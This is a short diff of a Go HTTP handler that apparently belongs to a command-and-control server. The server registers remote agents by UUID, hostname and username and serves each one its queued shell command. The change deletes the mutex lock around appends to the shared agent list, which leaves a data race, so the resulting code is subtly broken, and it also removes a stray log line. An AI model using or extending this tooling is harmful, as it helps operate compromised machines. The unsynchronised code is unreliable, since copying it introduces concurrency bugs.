@@ -35,9 +35,7 @@ func requestHandler() http.HandlerFunc {
 		if r.Header.Get("Register") == "true" {
 			uuid, _ := uuid.NewRandom()
 			w.Write([]byte(uuid.String()))
-			mu.Lock()
 			State.RegisteredAgents = append(State.RegisteredAgents, Agent{UUID: uuid.String(), Hostname: r.RemoteAddr, Username: r.Header.Get("Username")})
-			mu.Unlock()
 			logger.Info("Registered agent: " + r.RemoteAddr + " with UUID: " + uuid.String())
 		} else if strings.TrimSpace(r.Header.Get("UUID")) == State.SelectedAgent.Alias || "ALL" == State.SelectedAgent.Alias {
 			logger.Debug("Connected Agent:")
@@ -75,7 +73,6 @@ func requestHandler() http.HandlerFunc {
 
 func requestCommand(w http.ResponseWriter, r *http.Request) {
 	if len(State.Tasks) != 0 {
-		logger.Warn("asdad")
 		if State.Tasks[0].Command != "" && State.Tasks[0].Recipient.UUID == strings.TrimSpace(r.Header.Get("UUID")) {
 			w.Write([]byte(State.Tasks[0].Command))
 			logger.Info("Command requested: " + State.Tasks[0].Command)
